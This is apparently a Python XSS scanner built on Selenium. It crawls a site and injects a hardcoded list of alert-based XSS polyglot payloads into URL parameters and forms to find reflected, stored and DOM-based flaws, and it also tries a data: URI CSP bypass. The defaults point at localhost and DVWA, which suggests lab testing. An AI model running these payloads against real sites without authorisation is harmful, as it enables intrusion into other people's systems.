#!/usr/bin/env python3
import json, os, time, hashlib, argparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from crawler import SingleDomainCrawler
from utils.report import save_report

PAYLOAD_FILE = "payloads/xss_payloads.json"
SCREEN_DIR   = "screenshots/xss"
REPORT_FILE  = "reports/xss_report.html"

# 30 polyglot payloads (5 original + 25 extras)
DEFAULT_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><svg onload=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><iframe src=javascript:alert(1)>",
    # ----- extra arsenal -----
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "'><script>alert(1)</script>",
    "\\\"><script>alert(1)</script>",
    "<img src=# onerror=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<form><button formaction=javascript:alert(1)>X</button></form>",
    "<input type=image src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "'><svg/onload=alert(1)>",
    "<img src=`x` onerror=alert(1)>",
    "'\\\"><svg/onload=alert(1)//",
    "';alert(1);//",
    "\"><iframe src=javascript:alert(1)></iframe>",
    "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>"
]

os.makedirs(SCREEN_DIR, exist_ok=True)

# ---------- arg-parse ----------
parser = argparse.ArgumentParser()
parser.add_argument("--visible", action="store_true", help="show browser for demo")
parser.add_argument("target", nargs="?", default="http://localhost:3000", help="target base URL")
args = parser.parse_args()

def load_payloads():
    with open(PAYLOAD_FILE) as f:
        return json.load(f)

def start_driver():
    opts = Options()
    if not args.visible:
        opts.add_argument("--headless")
    opts.add_argument("--disable-gpu")
    return webdriver.Chrome(options=opts)

def capture(driver, url):
    fname = hashlib.md5(url.encode()).hexdigest() + ".png"
    path  = os.path.join(SCREEN_DIR, fname)
    driver.save_screenshot(path)
    return path

def run_scan(base_url):
    payloads = DEFAULT_PAYLOADS          # use the big list
    findings = []

    # ---- crawl ----
    bot = SingleDomainCrawler(base_url)
    bot.crawl()
    endpoints = {
        "params": {url: ["id"] for url in bot.pages.keys()},
        "forms":  list(bot.forms.keys())
    }

    # ---- manual known-vulnerable DVWA endpoint ----
    endpoints["params"]["http://localhost/dvwa/vulnerabilities/xss_r/"] = ["name"]

    driver = start_driver()

    # ----- Reflected XSS -----
    for page, params in endpoints["params"].items():
        for param in params:
            for p in payloads:
                url = f"{page}?{param}={p}"
                driver.get(url)
                try:
                    alert = driver.switch_to.alert
                    txt   = alert.text
                    alert.accept()
                    findings.append({
                        "type": "Reflected XSS",
                        "url": url,
                        "param": param,
                        "payload": p,
                        "evidence": txt,
                        "screenshot": capture(driver, url)
                    })
                except:
                    pass

    # ----- Stored XSS (simple) -----
    for form_url in endpoints["forms"]:
        for p in payloads:
            driver.get(form_url)
            inputs = driver.find_elements("xpath", "//input[@type='text'] | //textarea")
            if inputs:
                inputs[0].send_keys(p)
                try:
                    driver.find_element("xpath", "//input[@type='submit']").click()
                except:
                    pass
                time.sleep(1)
                driver.get(form_url.replace("submit", "view"))
                try:
                    alert = driver.switch_to.alert
                    alert.accept()
                    findings.append({
                        "type": "Stored XSS",
                        "url": form_url,
                        "param": "form",
                        "payload": p,
                        "screenshot": capture(driver, form_url)
                    })
                except:
                    pass

    # ----- DOM-based XSS -----
    for page in endpoints["params"]:
        driver.get(page)
        for p in payloads:
            driver.execute_script(f'document.write("{p}");')
            try:
                alert = driver.switch_to.alert
                alert.accept()
                findings.append({
                    "type": "DOM XSS",
                    "url": page,
                    "payload": p,
                    "evidence": "DOM write",
                    "screenshot": capture(driver, page)
                })
                break
            except:
                pass

    # ----- CSP bypass attempt -----
    csp_payload = '<script src="data:text/javascript,alert(1)"></script>'
    driver.get("http://localhost/dvwa/vulnerabilities/xss_r/?name=" + csp_payload)
    try:
        alert = driver.switch_to.alert
        alert.accept()
        findings.append({
            "type": "CSP bypass",
            "url": driver.current_url,
            "payload": csp_payload,
            "evidence": "data: URI allowed",
            "screenshot": capture(driver, driver.current_url)
        })
    except:
        pass

    driver.quit()

    # ---- reports ----
    save_report(findings, REPORT_FILE, "XSS")
    with open(REPORT_FILE.replace(".html", ".json"), "w", encoding="utf-8") as f:
        json.dump(findings, f, indent=2, ensure_ascii=False)
    print(f"[✅] XSS scan done – {len(findings)} findings")
    print(f"[+] HTML report → {REPORT_FILE}")
    print(f"[+] JSON report → {REPORT_FILE.replace('.html', '.json')}")
    return findings

if __name__ == "__main__":
    run_scan(args.target)